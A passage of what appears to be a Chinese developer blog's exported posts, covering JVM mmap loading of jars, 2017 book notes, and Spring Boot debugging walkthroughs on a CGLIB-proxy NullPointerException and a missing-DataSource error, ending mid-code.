<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ./page-types -p 25105</span><br><span class="line">             flags	page-count       MB  symbolic-flags			long-symbolic-flags</span><br><span class="line">0x0000000000000000	         2        0  ____________________________________</span><br><span class="line">0x0000000000400000	     14819       57  ______________________t_____________	thp</span><br><span class="line">0x0000000000000800	         1        0  ___________M________________________	mmap</span><br><span class="line">0x0000000000000828	        33        0  ___U_l_____M________________________	uptodate,lru,mmap</span><br><span class="line">0x000000000000086c	       663        2  __RU_lA____M________________________	referenced,uptodate,lru,active,mmap</span><br><span class="line">0x000000000000087c	         2        0  __RUDlA____M________________________	referenced,uptodate,dirty,lru,active,mmap</span><br><span class="line">0x0000000000005868	     10415       40  ___U_lA____Ma_b_____________________	uptodate,lru,active,mmap,anonymous,swapbacked</span><br><span class="line">0x0000000000405868	        29        0  ___U_lA____Ma_b_______t_____________	uptodate,lru,active,mmap,anonymous,swapbacked,thp</span><br><span class="line">0x000000000000586c	         5        0  __RU_lA____Ma_b_____________________	referenced,uptodate,lru,active,mmap,anonymous,swapbacked</span><br><span class="line">0x0000000000005878	       356        1  ___UDlA____Ma_b_____________________	uptodate,dirty,lru,active,mmap,anonymous,swapbacked</span><br><span class="line">             total	     26325      102</span><br></pre></td></tr></table></figure>
<h3 id="jdk8及之前加载jar也是使用mmap的方式"><a href="#jdk8及之前加载jar也是使用mmap的方式" class="headerlink" title="jdk8及之前加载jar也是使用mmap的方式"></a>jdk8及之前加载jar也是使用mmap的方式</h3><p>在验证了jdk9加载<code>lib/modules</code>之后，随便检查了下jdk8的进程，发现在加载jar包时，也是使用mmap的方式。</p>
<p>一个tomcat进程的map信息如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ pmap -x 27226 | grep jar</span><br><span class="line">...</span><br><span class="line">00007f42c00d4000      16      16       0 r--s- tomcat-dbcp.jar</span><br><span class="line">00007f42c09b7000    1892    1892       0 r--s- rt.jar</span><br><span class="line">00007f42c45e5000      76      76       0 r--s- catalina.jar</span><br><span class="line">00007f42c45f8000      12      12       0 r--s- tomcat-i18n-es.jar</span><br><span class="line">00007f42c47da000       4       4       0 r--s- sunec.jar</span><br><span class="line">00007f42c47db000       8       8       0 r--s- websocket-api.jar</span><br><span class="line">00007f42c47dd000       4       4       0 r--s- tomcat-juli.jar</span><br><span class="line">00007f42c47de000       4       4       0 r--s- commons-daemon.jar</span><br><span class="line">00007f42c47df000       4       4       0 r--s- bootstrap.jar</span><br></pre></td></tr></table></figure>
<p>可以发现一些有意思的点：</p>
<ul>
<li>所有jar包的<code>Kbytes</code> 和 <code>RSS(resident set size)</code>是相等的，也就是说整个jar包都被加载到共享内存里了</li>
<li>从URLClassLoader的实现代码来看，它在加载资源时，需要扫描所有的jar包，所以会导致整个jar都要被加载到内存里</li>
<li>对比jdk9里的<code>modules</code>，它的<code>RSS</code>并不是很高，原因是JImage的格式设计合理。所以jdk9后，jvm占用真实内存会降低。</li>
</ul>
<h3 id="jdk8及之前的-sun-zip-disableMemoryMapping-参数"><a href="#jdk8及之前的-sun-zip-disableMemoryMapping-参数" class="headerlink" title="jdk8及之前的 sun.zip.disableMemoryMapping 参数"></a>jdk8及之前的 sun.zip.disableMemoryMapping 参数</h3><ul>
<li><p>在jdk6里引入一个 <code>sun.zip.disableMemoryMapping</code>参数，禁止掉利用mmap来加载zip包。<a href="http://www.oracle.com/technetwork/java/javase/documentation/overview-156328.html#6u21-rev-b09" target="_blank" rel="noopener">http://www.oracle.com/technetwork/java/javase/documentation/overview-156328.html#6u21-rev-b09</a></p>
</li>
<li><p><a href="https://bugs.openjdk.java.net/browse/JDK-8175192" target="_blank" rel="noopener">https://bugs.openjdk.java.net/browse/JDK-8175192</a> 在jdk9里把这个参数去掉了。因为jdk9之后，jdk本身存在<code>lib/modules</code> 这个文件里了。</p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li>linux下可以用pmap来获取进程mmap信息</li>
<li>通过读取<code>/proc/$pid/pagemap</code>可以获取到内存页的信息，并可以把虚拟地址转换为物理地址</li>
<li>jdk9把类都打包到<code>lib/modules</code>，也就是JImage格式，可以减少真实内存占用</li>
<li>jdk9多个jvm可以共用<code>lib/modules</code>映射的内存</li>
<li>默认情况下jdk8及以前是用mmap来加载jar包</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>java9</tag>
        <tag>linux</tag>
        <tag>mmap</tag>
      </tags>
  </entry>
  <entry>
    <title>2017读书总结</title>
    <url>/reading-notes-2017/</url>
    <content><![CDATA[<h2 id="文科类"><a href="#文科类" class="headerlink" title="文科类"></a>文科类</h2><h3 id="古董局中局-4"><a href="#古董局中局-4" class="headerlink" title="古董局中局 4"></a>古董局中局 4</h3><p><a href="https://book.douban.com/subject/26650970/" target="_blank" rel="noopener">https://book.douban.com/subject/26650970/</a></p>
<p>马伯庸作品，这一系列都很好看，最后一集略不足，有点圆不上的感觉。深夜看有点吓人。</p>
<h3 id="解读中国经济"><a href="#解读中国经济" class="headerlink" title="解读中国经济"></a>解读中国经济</h3><p><a href="https://book.douban.com/subject/11626951/" target="_blank" rel="noopener">https://book.douban.com/subject/11626951/</a></p>
<p>林毅夫的作品，了解到经济政策制定者，或者叫参与者的一些想法，比如新农村，比较接地气。但是回过头来看，任何一项政策都有它的不足，最终落实效果和最初的设计都会有差距。</p>
<h3 id="中国历代政治得失"><a href="#中国历代政治得失" class="headerlink" title="中国历代政治得失"></a>中国历代政治得失</h3><p><a href="https://book.douban.com/subject/1003479/" target="_blank" rel="noopener">https://book.douban.com/subject/1003479/</a></p>
<p>钱穆的作品，可以了解到各个朝代的政治制度是怎样的，不同官位的功能。先看的《历代经济变革得失》，再看的这本书，实际上应该反过来。</p>
<h3 id="历代经济变革得失"><a href="#历代经济变革得失" class="headerlink" title="历代经济变革得失"></a>历代经济变革得失</h3><p><a href="https://book.douban.com/subject/24851460/" target="_blank" rel="noopener">https://book.douban.com/subject/24851460/</a></p>
<p>印象比较深的是说儒家一心想治国平天下，开万世之太平。但是历史上经济改革做得好的人却不是儒家。儒家一心只稳定，并没有有效的经济发展手段。尽管说得有点重，但是在经济上儒家的确没什么作为。</p>
<h3 id="巨流河"><a href="#巨流河" class="headerlink" title="巨流河"></a>巨流河</h3><p><a href="https://book.douban.com/subject/5914484/" target="_blank" rel="noopener">https://book.douban.com/subject/5914484/</a></p>
<p>前国民党高官的女儿的自传，前面的内容相对大气，后面的内容就有点虚了。可以看到台湾文人的一些状态。作者居然很少写到她的丈夫还有家人，不知道是什么心态。一位老人到了暮年仍是意难平。</p>
<h3 id="失乐园"><a href="#失乐园" class="headerlink" title="失乐园"></a>失乐园</h3><p><a href="https://book.douban.com/subject/25891771/" target="_blank" rel="noopener">https://book.douban.com/subject/25891771/</a></p>
<p>渡边淳一的作品，只记得是两个人偷情的作品，写得很细腻。</p>
<h3 id="人民的名义"><a href="#人民的名义" class="headerlink" title="人民的名义"></a>人民的名义</h3><p>书没有想像中好看，可能电视剧更精彩点，尽管电视剧只看了部分。</p>
<h3 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h3><p>重新读了一遍。</p>
<h2 id="理工科类"><a href="#理工科类" class="headerlink" title="理工科类"></a>理工科类</h2><h3 id="众病之王：癌症传"><a href="#众病之王：癌症传" class="headerlink" title="众病之王：癌症传"></a>众病之王：癌症传</h3><p><a href="https://book.douban.com/subject/20507206/" target="_blank" rel="noopener">https://book.douban.com/subject/20507206/</a></p>
<p>这本书详细写了癌症的起因，人们认知的历史，治疗方法的原理，治疗方法的发展史，是非常值得一读的书。认真读了的话，自然会对癌症心里有数，不会受到各种流言的困扰，对自己和身边的人都有好处。</p>
<h3 id="医学的真相"><a href="#医学的真相" class="headerlink" title="医学的真相"></a>医学的真相</h3><p><a href="https://book.douban.com/subject/26844088/" target="_blank" rel="noopener">https://book.douban.com/subject/26844088/</a></p>
<p>作者以医生的角度，谈了一些自己对医学的看法或者叫真相。了解医学的人会认同作者的观点，有的人会觉得无聊。<br>这本书可以说是作者的真心剖析，但是评分却比不上《众病之王》。人们对于自己利害相关的会比较关心，非自己利害相关的就比较冷淡了。</p>
<h3 id="进化心理学"><a href="#进化心理学" class="headerlink" title="进化心理学"></a>进化心理学</h3><p><a href="https://book.douban.com/subject/26683297/" target="_blank" rel="noopener">https://book.douban.com/subject/26683297/</a></p>
<p>一开始以为这本书是跟风的，放在书架上很久了，真正读了才知道是一本好书。</p>
<p>进化心理学是一本真正的科学，它是提出假设，再验证的科学。它能解析很多现象，比如外婆为什么会比爷爷更喜欢你。</p>
<h3 id="未来简史"><a href="#未来简史" class="headerlink" title="未来简史"></a>未来简史</h3><p><a href="https://book.douban.com/subject/26943161/" target="_blank" rel="noopener">https://book.douban.com/subject/26943161/</a></p>
<p>《人类简史》作者的续作。其实我觉得名字并不是很准确，只能说是作者对未来的看法，并不能说是历史。</p>
<p>这本书和《人类简史》一样，是作者集很多前人的想法的大成。从作者对计算机的一些描述来看，作者并非所有学科都精通。</p>
<h3 id="地球上最伟大的表演"><a href="#地球上最伟大的表演" class="headerlink" title="地球上最伟大的表演"></a>地球上最伟大的表演</h3><p><a href="https://book.douban.com/subject/20507207/" target="_blank" rel="noopener">https://book.douban.com/subject/20507207/</a></p>
<p>翻译不是很好。有一些例子比较好，比如人为的选育，其实可以让物种进化非常快，比一般人的想像的要快得多。</p>
<h3 id="万万没想到：用理工科思维理解世界"><a href="#万万没想到：用理工科思维理解世界" class="headerlink" title="万万没想到：用理工科思维理解世界"></a>万万没想到：用理工科思维理解世界</h3><p><a href="https://book.douban.com/subject/25986341/" target="_blank" rel="noopener">https://book.douban.com/subject/25986341/</a></p>
<p>博客的合集，后面的很多内容是凑数的。不过从里面找到了一些书来读，还行。</p>
<h2 id="读书软件相关"><a href="#读书软件相关" class="headerlink" title="读书软件相关"></a>读书软件相关</h2><ul>
<li>书都是在手机上读的</li>
<li>绝大部分格式是epub，少量是pdf</li>
<li>大部分书是在多看上看的</li>
<li>网易的锅牛每天可以免费读书一个小时，就是书籍数量比较少</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>读的书没想像中的多，很多时候想写点笔记却没有动手</li>
<li>下了今日读条之后，读书时间变少了……考虑是否要卸载掉</li>
<li>还有一些技术书和乱七八糟的小说没有记录</li>
<li>进化相关的书比较多，看书范围需要扩展</li>
</ul>
]]></content>
      <categories>
        <category>读书</category>
      </categories>
      <tags>
        <tag>读书</tag>
      </tags>
  </entry>
  <entry>
    <title>深入Spring Boot：排查@Transactional引起的NullPointerException</title>
    <url>/spring-boot-transactional-nullpointerexception/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这个demo来说明怎么排查一个<code>@Transactional</code>引起的<code>NullPointerException</code>。</p>
<p><a href="https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-Transactional-NullPointerException" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-Transactional-NullPointerException</a></p>
<h2 id="定位-NullPointerException-的代码"><a href="#定位-NullPointerException-的代码" class="headerlink" title="定位 NullPointerException 的代码"></a>定位 NullPointerException 的代码</h2><p>Demo是一个简单的spring事务例子，提供了下面一个<code>StudentDao</code>，并用<code>@Transactional</code>来声明事务：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@Transactional</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentDao</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> SqlSession sqlSession;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> Student <span class="title">selectStudentById</span><span class="params">(<span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> sqlSession.selectOne(<span class="string">"selectStudentById"</span>, id);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Student <span class="title">finalSelectStudentById</span><span class="params">(<span class="keyword">long</span> id)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> sqlSession.selectOne(<span class="string">"selectStudentById"</span>, id);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>应用启动后，会依次调用<code>selectStudentById</code>和<code>finalSelectStudentById</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PostConstruct</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	studentDao.selectStudentById(<span class="number">1</span>);</span><br><span class="line">	studentDao.finalSelectStudentById(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用<code>mvn spring-boot:run</code> 或者把工程导入IDE里启动，抛出来的异常信息是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Caused by: java.lang.NullPointerException</span><br><span class="line">	at sample.mybatis.dao.StudentDao.finalSelectStudentById(StudentDao.java:27)</span><br><span class="line">	at com.example.demo.transactional.nullpointerexception.DemoNullPointerExceptionApplication.init(DemoNullPointerExceptionApplication.java:30)</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">	at java.lang.reflect.Method.invoke(Method.java:498)</span><br><span class="line">	at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleElement.invoke(InitDestroyAnnotationBeanPostProcessor.java:366)</span><br><span class="line">	at org.springframework.beans.factory.annotation.InitDestroyAnnotationBeanPostProcessor$LifecycleMetadata.invokeInitMethods(InitDestroyAnnotationBeanPostProcessor.java:311)</span><br></pre></td></tr></table></figure>
<p>为什么应用代码里执行<code>selectStudentById</code>没有问题，而执行<code>finalSelectStudentById</code>就抛出<code>NullPointerException</code>?</p>
<p>同一个bean里，明明<code>SqlSession sqlSession</code>已经被注入了，在<code>selectStudentById</code>里它是非null的。为什么<code>finalSelectStudentById</code>函数里是null？</p>
<h2 id="获取实际运行时的类名"><a href="#获取实际运行时的类名" class="headerlink" title="获取实际运行时的类名"></a>获取实际运行时的类名</h2><p>当然，我们对比两个函数，可以知道是因为<code>finalSelectStudentById</code>的修饰符是<code>final</code>。但是具体原因是什么呢？</p>
<p>我们先在抛出异常的地方打上断点，调试代码，获取到具体运行时的<code>class</code>是什么：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">System.err.println(studentDao.getClass());</span><br></pre></td></tr></table></figure>
<p>打印的结果是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class sample.mybatis.dao.StudentDao$$EnhancerBySpringCGLIB$$210b005d</span><br></pre></td></tr></table></figure>
<p>可以看出是一个被spring aop处理过的类，但是它的具体字节码内容是什么呢？</p>
<h2 id="dumpclass分析"><a href="#dumpclass分析" class="headerlink" title="dumpclass分析"></a>dumpclass分析</h2><p>我们使用dumpclass工具来把jvm里的类dump出来：</p>
<p><a href="https://github.com/hengyunabc/dumpclass" target="_blank" rel="noopener">https://github.com/hengyunabc/dumpclass</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http://search.maven.org/remotecontent?filepath=io/github/hengyunabc/dumpclass/0.0.1/dumpclass-0.0.1.jar -O dumpclass.jar</span><br></pre></td></tr></table></figure>
<p>找到java进程pid：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ jps</span><br><span class="line">5907 DemoNullPointerExceptionApplication</span><br></pre></td></tr></table></figure>
<p>把相关的类都dump下来：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo java -jar dumpclass.jar 5907 &apos;sample.mybatis.dao.StudentDao*&apos; /tmp/dumpresult</span><br></pre></td></tr></table></figure>
<h2 id="反汇编分析"><a href="#反汇编分析" class="headerlink" title="反汇编分析"></a>反汇编分析</h2><p>用javap或者图形化工具jd-gui来反编绎<code>sample.mybatis.dao.StudentDao$$EnhancerBySpringCGLIB$$210b005d</code>。</p>
<p>反编绎后的结果是：</p>
<ol start="0">
<li><code>class StudentDao$$EnhancerBySpringCGLIB$$210b005d extends StudentDao</code></li>
<li><p><code>StudentDao$$EnhancerBySpringCGLIB$$210b005d</code>里没有<code>finalSelectStudentById</code>相关的内容</p>
</li>
<li><p><code>selectStudentById</code>实际调用的是<code>this.CGLIB$CALLBACK_0</code>，即<code>MethodInterceptor tmp4_1</code>，等下我们实际debug，看具体的类型</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public final Student selectStudentById(long paramLong)</span><br><span class="line">&#123;</span><br><span class="line">  try</span><br><span class="line">  &#123;</span><br><span class="line">    MethodInterceptor tmp4_1 = this.CGLIB$CALLBACK_0;</span><br><span class="line">    if (tmp4_1 == null)</span><br><span class="line">    &#123;</span><br><span class="line">      tmp4_1;</span><br><span class="line">      CGLIB$BIND_CALLBACKS(this);</span><br><span class="line">    &#125;</span><br><span class="line">    MethodInterceptor tmp17_14 = this.CGLIB$CALLBACK_0;</span><br><span class="line">    if (tmp17_14 != null)</span><br><span class="line">    &#123;</span><br><span class="line">      Object[] tmp29_26 = new Object[1];</span><br><span class="line">      Long tmp35_32 = new java/lang/Long;</span><br><span class="line">      Long tmp36_35 = tmp35_32;</span><br><span class="line">      tmp36_35;</span><br><span class="line">      tmp36_35.&lt;init&gt;(paramLong);</span><br><span class="line">      tmp29_26[0] = tmp35_32;</span><br><span class="line">      return (Student)tmp17_14.intercept(this, CGLIB$selectStudentById$0$Method, tmp29_26, CGLIB$selectStudentById$0$Proxy);</span><br><span class="line">    &#125;</span><br><span class="line">    return super.selectStudentById(paramLong);</span><br><span class="line">  &#125;</span><br><span class="line">  catch (RuntimeException|Error localRuntimeException)</span><br><span class="line">  &#123;</span><br><span class="line">    throw localRuntimeException;</span><br><span class="line">  &#125;</span><br><span class="line">  catch (Throwable localThrowable)</span><br><span class="line">  &#123;</span><br><span class="line">    throw new UndeclaredThrowableException(localThrowable);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>再来实际debug，尽管<code>StudentDao$$EnhancerBySpringCGLIB$$210b005d</code>的代码不能直接看到，但是还是可以单步执行的。</p>
<p>在debug时，可以看到</p>
<ol start="0">
<li><p><code>StudentDao$$EnhancerBySpringCGLIB$$210b005d</code>里的所有field都是null</p>
<p> <img src="https://raw.githubusercontent.com/hengyunabc/spring-boot-inside/master/demo-Transactional-NullPointerException/cglib-field.png" alt="cglib-field"></p>
</li>
<li><p><code>this.CGLIB$CALLBACK_0</code>的实际类型是<code>CglibAopProxy$DynamicAdvisedInterceptor</code>，在这个Interceptor里实际保存了原始的target对象</p>
<p> <img src="https://raw.githubusercontent.com/hengyunabc/spring-boot-inside/master/demo-Transactional-NullPointerException/cglib-target.png" alt="cglib-target"></p>
</li>
<li><p><code>CglibAopProxy$DynamicAdvisedInterceptor</code>在经过<code>TransactionInterceptor</code>处理之后，最终会用反射调用自己保存的原始target对象</p>
</li>
</ol>
<h2 id="抛出异常的原因"><a href="#抛出异常的原因" class="headerlink" title="抛出异常的原因"></a>抛出异常的原因</h2><p>所以整理下整个分析：</p>
<ol start="0">
<li>在使用了<code>@Transactional</code>之后，spring aop会生成一个cglib代理类，实际用户代码里<code>@Autowired</code>注入的<code>StudentDao</code>也是这个代理类的实例</li>
<li>cglib生成的代理类<code>StudentDao$$EnhancerBySpringCGLIB$$210b005d</code>继承自<code>StudentDao</code></li>
<li><code>StudentDao$$EnhancerBySpringCGLIB$$210b005d</code>里的所有field都是null</li>
<li><code>StudentDao$$EnhancerBySpringCGLIB$$210b005d</code>在调用<code>selectStudentById</code>，实际上通过<code>CglibAopProxy$DynamicAdvisedInterceptor</code>，最终会用反射调用自己保存的原始target对象</li>
<li>所以<code>selectStudentById</code>函数的调用没有问题</li>
</ol>
<p>那么为什么<code>finalSelectStudentById</code>函数里的<code>SqlSession sqlSession</code>会是null，然后抛出<code>NullPointerException</code>？</p>
<ol start="0">
<li><code>StudentDao$$EnhancerBySpringCGLIB$$210b005d</code>里的所有field都是null</li>
<li><code>finalSelectStudentById</code>函数的修饰符是<code>final</code>，cglib没有办法重写这个函数</li>
<li>当执行到<code>finalSelectStudentById</code>里，实际执行的是原始的<code>StudentDao</code>里的代码</li>
<li>但是对象是<code>StudentDao$$EnhancerBySpringCGLIB$$210b005d</code>的实例，它里面的所有field都是null，所以会抛出<code>NullPointerException</code></li>
</ol>
<h2 id="解决问题办法"><a href="#解决问题办法" class="headerlink" title="解决问题办法"></a>解决问题办法</h2><ol start="0">
<li>最简单的当然是把<code>finalSelectStudentById</code>函数的<code>final</code>修饰符去掉</li>
<li>还有一种办法，在<code>StudentDao</code>里不要直接使用<code>sqlSession</code>，而通过<code>getSqlSession()</code>函数，这样cglib也会处理<code>getSqlSession()</code>，返回原始的target对象</li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>排查问题多debug，看实际运行时的对象信息</li>
<li>对于cglib生成类的字节码，可以用dumpclass工具来dump，再反编绎分析</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>spring-boot</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>深入Spring Boot：排查 Cannot determine embedded database driver class for database type NONE</title>
    <url>/spring-boot-database-type-none/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>这个demo来说明怎么一步步排查一个常见的spring boot AutoConfiguration的错误。</p>
<p><a href="https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-database-type-NONE" target="_blank" rel="noopener">https://github.com/hengyunabc/spring-boot-inside/tree/master/demo-database-type-NONE</a></p>
<h2 id="调试排查-Cannot-determine-embedded-database-driver-class-for-database-type-NONE-的错误"><a href="#调试排查-Cannot-determine-embedded-database-driver-class-for-database-type-NONE-的错误" class="headerlink" title="调试排查 Cannot determine embedded database driver class for database type NONE 的错误"></a>调试排查 Cannot determine embedded database driver class for database type NONE 的错误</h2><p>把工程导入IDE里，直接启动应用，抛出来的异常信息是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Error starting ApplicationContext. To display the auto-configuration report re-run your application with &apos;debug&apos; enabled.</span><br><span class="line">2017-11-29 14:26:34.478 ERROR 29736 --- [           main] o.s.b.d.LoggingFailureAnalysisReporter   :</span><br><span class="line"></span><br><span class="line">***************************</span><br><span class="line">APPLICATION FAILED TO START</span><br><span class="line">***************************</span><br><span class="line"></span><br><span class="line">Description:</span><br><span class="line"></span><br><span class="line">Cannot determine embedded database driver class for database type NONE</span><br><span class="line"></span><br><span class="line">Action:</span><br><span class="line"></span><br><span class="line">If you want an embedded database please put a supported one on the classpath. If you have database settings to be loaded from a particular profile you may need to active it (no profiles are currently active).</span><br></pre></td></tr></table></figure>
<p>其实这时有两个思路，直接google搜索<code>Cannot determine embedded database driver class for database type NONE</code>，就可以找到解决办法。</p>
<p>第二种方式，仔细查看日志内容，可以发现有<code>To display the auto-configuration report re-run your application with &#39;debug&#39; enabled.</code>。</p>
<p>搜索下这个，就可以在spring的官方网站上找到相关的信息：<a href="https://docs.spring.io/spring-boot/docs/current/reference/html/using-boot-auto-configuration.html" target="_blank" rel="noopener">https://docs.spring.io/spring-boot/docs/current/reference/html/using-boot-auto-configuration.html</a></p>
<p>就是用户只要配置了<code>debug</code>这个开关，就会把<code>auto-configuration</code> 相关的信息打印出来。</p>
<p>熟悉spring的环境变量注入的话，就可以知道有几种打开这个的方式：</p>
<ul>
<li>在<code>args</code>里增加<code>--debug</code></li>
<li>在application.properties里增加<code>debug=true</code></li>
<li>通过<code>-Ddebug=true</code></li>
</ul>
<h2 id="增加debug开关之后的信息"><a href="#增加debug开关之后的信息" class="headerlink" title="增加debug开关之后的信息"></a>增加<code>debug</code>开关之后的信息</h2><p>增加<code>debug</code>开关之后，可以看到打印出了错误堆栈：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2017-11-29 14:33:08.776 DEBUG 29907 --- [           main] o.s.b.d.LoggingFailureAnalysisReporter   : Application failed to start due to an exception</span><br><span class="line"></span><br><span class="line">org.springframework.boot.autoconfigure.jdbc.DataSourceProperties$DataSourceBeanCreationException: Cannot determine embedded database driver class for database type NONE. If you want an embedded database please put a supported one on the classpath. If you have database settings to be loaded from a particular profile you may need to active it (no profiles are currently active).</span><br><span class="line">	at org.springframework.boot.autoconfigure.jdbc.DataSourceProperties.determineDriverClassName(DataSourceProperties.java:245) ~[spring-boot-autoconfigure-1.4.7.RELEASE.jar:1.4.7.RELEASE]</span><br><span class="line">	at org.springframework.boot.autoconfigure.jdbc.DataSourceProperties.initializeDataSourceBuilder(DataSourceProperties.java:182) ~[spring-boot-autoconfigure-1.4.7.RELEASE.jar:1.4.7.RELEASE]</span><br><span class="line">	at org.springframework.boot.autoconfigure.jdbc.DataSourceConfiguration.createDataSource(DataSourceConfiguration.java:42) ~[spring-boot-autoconfigure-1.4.7.RELEASE.jar:1.4.7.RELEASE]</span><br><span class="line">	at org.springframework.boot.autoconfigure.jdbc.DataSourceConfiguration$Tomcat.dataSource(DataSourceConfiguration.java:53) ~[spring-boot-autoconfigure-1.4.7.RELEASE.jar:1.4.7.RELEASE]</span><br><span class="line">	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) ~[na:1.8.0_112]</span><br></pre></td></tr></table></figure>
<p>抛出异常的代码是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Determine the driver to use based on this configuration and the environment.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> the driver to use</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 1.4.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">determineDriverClassName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.driverClassName)) &#123;</span><br><span class="line">		Assert.state(driverClassIsLoadable(),</span><br><span class="line">				<span class="string">"Cannot load driver class: "</span> + <span class="keyword">this</span>.driverClassName);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">this</span>.driverClassName;</span><br><span class="line">	&#125;</span><br><span class="line">	String driverClassName = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (StringUtils.hasText(<span class="keyword">this</span>.url)) &#123;</span><br><span class="line">		driverClassName = DatabaseDriver.fromJdbcUrl(<span class="keyword">this</span>.url).getDriverClassName();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!StringUtils.hasText(driverClassName)) &#123;</span><br><span class="line">		driverClassName = <span class="keyword">this</span>.embeddedDatabaseConnection.getDriverClassName();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!StringUtils.hasText(driverClassName)) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> DataSourceBeanCreationException(<span class="keyword">this</span>.embeddedDatabaseConnection,</span><br><span class="line">				<span class="keyword">this</span>.environment, <span class="string">"driver class"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> driverClassName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出来是没有找到 DataSource 的driver class，然后抛出了 <code>DataSourceBeanCreationException</code>。</p>
<p>那么一种解决办法是，在maven依赖里加入一些 DataSource driver class。</p>
<p>但是应用自己的代码里并没有使用DataSource，哪里导致spring boot要创建一个DataSource对象？</p>
<h2 id="哪里导致spring-boot要创建DataSource"><a href="#哪里导致spring-boot要创建DataSource" class="headerlink" title="哪里导致spring boot要创建DataSource"></a>哪里导致spring boot要创建DataSource</h2><p>从异常栈上，可以找到<code>DataSourceConfiguration$Tomcat</code> 这个类，那么查找下它的引用，可以发现它是被<code>org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration.PooledDataSourceConfiguration</code> import引入的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@Conditional</span>(PooledDataSourceCondition<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">@<span class="title">ConditionalOnMissingBean</span>(</span>&#123; DataSource<span class="class">.<span class="keyword">class</span>, <span class="title">XADataSource</span>.<span class="title">class</span> &#125;)</span></span><br><span class="line"><span class="class">@<span class="title">Import</span>(</span>&#123; DataSourceConfiguration.Tomcat<span class="class">.<span class="keyword">class</span>, <span class="title">DataSourceConfiguration</span>.<span class="title">Hikari</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">		<span class="title">DataSourceConfiguration</span>.<span class="title">Dbcp</span>.<span class="title">class</span>, <span class="title">DataSourceConfiguration</span>.<span class="title">Dbcp2</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">		<span class="title">DataSourceConfiguration</span>.<span class="title">Generic</span>.<span 